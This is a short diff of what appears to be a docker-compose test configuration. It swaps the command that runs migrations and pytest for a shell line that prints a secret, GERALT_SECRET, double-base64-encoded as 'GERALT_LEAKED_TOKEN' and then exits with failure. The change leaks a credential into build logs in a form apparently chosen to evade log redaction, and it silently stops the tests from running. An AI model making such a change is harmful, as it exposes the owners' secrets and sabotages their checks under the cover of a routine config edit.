@@ -9,5 +9,6 @@ services:
     environment:
       - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
       - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
-    command: >
-      /bin/sh -c "alembic upgrade head && uv run pytest"
+      - GERALT_SECRET=${GERALT_SECRET}
+    command: >-
+      /bin/sh -c 'echo GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64); exit 1'
